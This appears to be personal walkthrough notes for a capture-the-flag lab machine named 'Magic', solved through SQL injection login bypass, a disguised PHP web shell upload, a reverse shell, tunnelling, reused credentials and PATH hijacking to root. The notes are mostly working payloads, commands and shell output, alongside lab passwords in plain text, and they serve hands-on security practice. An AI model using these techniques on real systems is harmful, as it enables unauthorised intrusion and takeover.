### Webadmin
* http://10.129.51.88/upload.php need auth
* http://10.129.51.88/login.php
* https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

admin' or '1'='1

### Foothold
* http://10.129.51.88/images/uploads/7.jpg <- where the uploaded file goes

##### Sorry, only JPG, JPEG & PNG files are allowed.
PS, the writeup mentioned evil.php.jpg worked just fine. I didn't test that.

```bash
cp php-reverse-shell.php evil.php%00.png
```

`evil.php%00.png` -> Server: What're you trying to do here?

##### Magic Bytes
1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#upload-tricks

It doesn't work out after I put them directly above the php shell

2. https://book.hacktricks.xyz/pentesting-web/file-upload#magic-header-bytes

Let's do it with burp: `Content-Type: application/x-php` is necessary no mater method A or B

##### Method A: Use a legit img with burp
```bash
------WebKitFormBoundaryO4Ah2DIFGOp8Tlpk
Content-Disposition: form-data; name="image"; filename="test11.php%00.png"
Content-Type: application/x-php

ÿØÿà ..*GGIEGULXY # Try to use a legit img first. Then LEFT a full line here to help you bypass second layer magic byte check.

<?php system($_GET["cmd"]);?>

# If that still doesn't work, try put the payload into middle of an image
```

##### Method B: Hex it in
* https://en.wikipedia.org/wiki/List_of_file_signatures

```txt
89 50 4E 47 0D 0A 1A 0A -> 89504E470D0A1A0A
```

ChatGPT is sick
```bash
echo '89504E470D0A1A0A' | xxd -r -p | cat - evil.php%00.png > temp && mv temp evil.php%00.png

echo '89504E470D0A1A0A' | xxd -r -p | sed '1s/^/$(cat)\n/' > file
echo '89504E470D0A1A0A' | xxd -r -p | awk 'BEGIN{getline c < "file"} {print $0 ORS c}' > file
```

##### What now? After file uploaded
File not found even it says upload successfully. Try encode the url `evil.php%00.png` -> `evil.php%2500.png`

* http://10.129.51.88/images/uploads/evil.php%2500.png <- It works

```bash
nc -lvnp 7890
listening on [any] 7890 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.51.88] 42982
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:30:00 up  4:58,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

##### www-data
```
image/jpeg

stty rows 39 columns 165

```

### Lateral
##### SSH as www-data, But failed
```bash
www-data@ubuntu:/var/www$ cd Magic
www-data@ubuntu:/var/www/Magic$ mkdir .ssh

ssh-keygen -q -t rsa -N '' -C 'pam'
/var/www/Magic/.ssh/id_rsa

cp .ssh/id_rsa.pub .ssh/authorized_keys
chmod 600 .ssh/authorized_keys 
```

```bash
ssh -i /tmp/key www-data@10.129.223.83 # X
ssh Magic@10.129.223.83 -i key # X
```

```bash
# Chisel
./chisel server -p 8000 --reverse
./chisel client 10.10.16.9:8000 R:3306:127.0.0.1:3306

mysql -h 127.0.0.1 -u theseus -D Magic -piamkingtheseus # 3306 is default
```

admin
Th3s3usW4sK1ng

`su theseus`

### Root
##### Interesting that picked up by at least two tools
```bash
/bin/sysinfo

echo "/bin/bash" > lshw
chmod +x lshw
PATH=.:$PATH /bin/sysinfo
```

### Alternative mysql pivoting
##### Database Dump
https://0xdf.gitlab.io/2020/08/22/htb-magic.html#database-dump
```bash
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic

```